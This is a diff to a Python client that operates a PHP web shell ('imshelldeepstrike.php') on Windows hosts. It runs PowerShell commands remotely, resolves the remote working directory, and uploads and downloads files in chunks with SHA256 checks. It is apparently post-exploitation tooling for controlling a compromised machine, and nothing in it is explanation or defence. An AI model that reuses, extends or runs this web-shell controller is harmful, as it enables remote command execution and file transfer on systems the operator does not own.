@@ -1,6 +1,7 @@
 import base64
 import hashlib
 import os
+import re
 import sys
 from datetime import datetime, timezone
 from pathlib import Path
@@ -134,12 +135,41 @@ def extract_pre(text: str) -> str:
     return text[start + len("<pre>") : end].strip()
 
 
+def extract_sha256_from_response(text: str) -> Optional[str]:
+    """
+    Extract a 64-character SHA256 hex string from command output.
+    Use when the server may echo the command or wrap output; we want the actual hash.
+    """
+    match = re.search(r"\b([a-fA-F0-9]{64})\b", text)
+    return match.group(1).lower() if match else None
+
+
 def ps_escape_single_quotes(value: str) -> str:
     """
     Escape single quotes for use inside a single-quoted PowerShell string literal.
     In PowerShell, single quotes are escaped by doubling them: ' -> ''.
     """
     return value.replace("'", "''")
+
+
+def _is_absolute_remote_path(path: str) -> bool:
+    """True if path looks like an absolute path on Windows (e.g. C:\... or \\...)."""
+    path = path.strip()
+    if len(path) >= 2 and path[1] == ":" and path[0].isalpha():
+        return True
+    if path.startswith("\\\\") or path.startswith("/"):
+        return True
+    return False
+
+
+def get_remote_cwd() -> Optional[str]:
+    """Get the remote (PowerShell) current working directory for path resolution."""
+    cmd = "powershell -NoLogo -NonInteractive -Command \"(Get-Location).Path\""
+    body, status = send_command(cmd)
+    if status != 200 or not body:
+        return None
+    cwd = extract_pre(body).strip().strip('"')
+    return cwd if cwd else None
 
 
 def download_file(remote_path: str, local_path: str) -> int:
@@ -175,14 +205,20 @@ def download_file(remote_path: str, local_path: str) -> int:
 
 def upload_file(local_path: str, remote_path: str) -> dict:
     """
-    Upload a local file to a **Windows** target using the direct POST upload
-    method (r/n parameters) via /imshelldeepstrike.php.
-    The file is saved to the full remote_path provided by the user.
+    Upload a local file to a **Windows** target using multipart POST via
+    /imshelldeepstrike.php. The file is saved to the full remote_path.
     Large files are automatically chunked to avoid PHP POST size limits.
     """
     path = Path(local_path)
     if not path.is_file():
         raise FileNotFoundError(f"local file not found: {local_path}")
+
+    # Resolve relative remote path so PHP and PowerShell use the same file
+    if not _is_absolute_remote_path(remote_path):
+        cwd = get_remote_cwd()
+        if cwd:
+            sep = "\\" if "\\" in cwd else "/"
+            remote_path = cwd.rstrip(sep) + sep + remote_path.replace("/", sep)
 
     data = path.read_bytes()
     total = len(data)
@@ -278,7 +314,11 @@ def upload_file(local_path: str, remote_path: str) -> dict:
         "else {{'NO_SUCH_FILE'}}\""
     )
     hash_body, hash_status = send_command(hash_cmd)
-    remote_hash_text = extract_pre(hash_body).strip()
+    raw_text = extract_pre(hash_body).strip()
+    # Server may echo the command; extract the actual 64-char SHA256 if present
+    remote_hash_text = extract_sha256_from_response(hash_body) or raw_text
+    if not remote_hash_text and "NO_SUCH_FILE" in raw_text:
+        remote_hash_text = "NO_SUCH_FILE"
 
     return {
         "total": total,
